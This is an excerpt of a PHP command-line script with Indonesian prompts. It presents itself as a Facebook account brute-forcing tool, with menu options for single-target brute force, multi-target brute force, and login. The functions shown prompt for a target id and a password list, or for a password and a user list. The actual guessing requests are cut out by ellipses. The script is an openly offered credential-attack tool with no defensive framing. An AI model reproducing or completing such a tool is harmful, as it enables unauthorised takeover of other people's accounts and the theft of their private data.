...
function bf() {
  $file = $_SERVER[argv][0];
  echo "\n\e[1;32m[+]\e[1;33m masukan id : \e[0m";
  $user=trim(fgets(STDIN));
  echo "\n\e[1;32m[+]\e[1;33m masukan passlist : \e[0m";
...
function mbf() {
  $file = $_SERVER[argv][0];
  echo "\n\e[1;32m[+] \e[1;32mmasukan password : \e[0m";
  $pass=trim(fgets(STDIN));
  echo "\n\e[1;32m[+] \e[1;32mmasukan userlist : \e[0m";
  $wordlist=trim(fgets(STDIN));
...
function login(){
  $file = $_SERVER[argv][0];
  echo "\n\e[1;32m[+]\e[1;32m id : \e[0m";
  $user=trim(fgets(STDIN));
  echo "\n\e[1;32m[+]\e[1;32m password : \e[0m";
  $pass=trim(fgets(STDIN));
...
print $banner;
print "\n
\033[1;37m[1]\033[1;32m Bruteforce Facebook
\033[1;37m[2]\033[1;32m Multi Bruteforce Facebook
\033[1;37m[3]\033[1;32m Login Facebook
\033[1;37m[4] \033[1;31mKeluar\n";

echo " \n\033[1;37m[*] \033[1;33mInput Nomor : \033[0m";
